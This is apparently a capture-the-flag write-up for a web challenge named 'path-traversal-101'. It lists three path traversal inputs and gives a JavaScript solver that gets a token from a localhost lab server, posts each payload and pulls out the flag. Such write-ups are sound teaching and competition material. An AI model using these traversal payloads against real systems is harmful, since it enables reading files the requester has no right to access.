# Write-up: path-traversal-101

## Category: web

## Author tomek7667

-   Solution 1: `/robot/../flag/.`
-   Solution 2: `..././flag`
-   Solution 3: `././flag`

The automatic solver is here:

```javascript
const host = "http://localhost:10001";

const getToken = async () => {
    const url_Kfwn_1 = `${host}/%F0%9F%A4%96`;
    const headers_VUTd_1 = {
        "User-Agent": "robot",
        Connection: "close",
    };

    const response = await fetch(url_Kfwn_1, {
        method: "GET",
        headers: headers_VUTd_1,
    });

    const cookie = response.headers.get("set-cookie").match(/token=.*;/)[0];
    return cookie.split("=")[1].split(";")[0];
};

const sendRequest_1 = async (cookie) => {
    const url_iogW_1 = `${host}/%F0%9F%A4%96`;
    const cookie_Yuos_1 = `token=${cookie}`;
    const headers_WDXZ_1 = {
        Origin: host,
        Cookie: cookie_Yuos_1,
        "User-Agent": "robot",
        Referer: `${host}/%F0%9F%A4%96`,
        Connection: "close",
        "Content-Type": "application/x-www-form-urlencoded",
    };

    const body_qtYz_1 = `solution=%2Frobot%2F..%2Fflag%2F.`;
    const response = await fetch(url_iogW_1, {
        method: "POST",
        headers: headers_WDXZ_1,
        body: body_qtYz_1,
    });

    await response.text();
};

const sendRequest_2 = async (cookie) => {
    const url_skKk_1 = `${host}/%F0%9F%A4%96`;
    const cookie_Mqps_1 = `token=${cookie}`;
    const headers_sAZy_1 = {
        Origin: host,
        Cookie: cookie_Mqps_1,
        "User-Agent": "robot",
        Referer: `${host}/%F0%9F%A4%96`,
        Connection: "close",
        "Content-Type": "application/x-www-form-urlencoded",
    };

    const body_PqUX_1 = `solution=...%2F.%2Fflag`;
    const response = await fetch(url_skKk_1, {
        method: "POST",
        headers: headers_sAZy_1,
        body: body_PqUX_1,
    });

    await response.text();
};

const sendRequest_3 = async (cookie) => {
    const url_UOOh_1 = `${host}/%F0%9F%A4%96`;
    const cookie_HSMS_1 = `token=${cookie}`;
    const headers_eAdJ_1 = {
        Origin: host,
        Cookie: cookie_HSMS_1,
        "User-Agent": "robot",
        Referer: `${host}/%F0%9F%A4%96`,
        Connection: "close",
        "Content-Type": "application/x-www-form-urlencoded",
    };

    const body_FoHg_1 = `solution=.%2F.%2Fflag`;
    const response = await fetch(url_UOOh_1, {
        method: "POST",
        headers: headers_eAdJ_1,
        body: body_FoHg_1,
    });

    const responseText_DsCz_1 = await response.text();
    return responseText_DsCz_1.match(/ping{.*}/)[0];
};

const main = async () => {
    const token = await getToken();
    await sendRequest_1(token);
    await sendRequest_2(token);
    const flag = await sendRequest_3(token);
    console.log({ flag });
};

(() => main())();
```
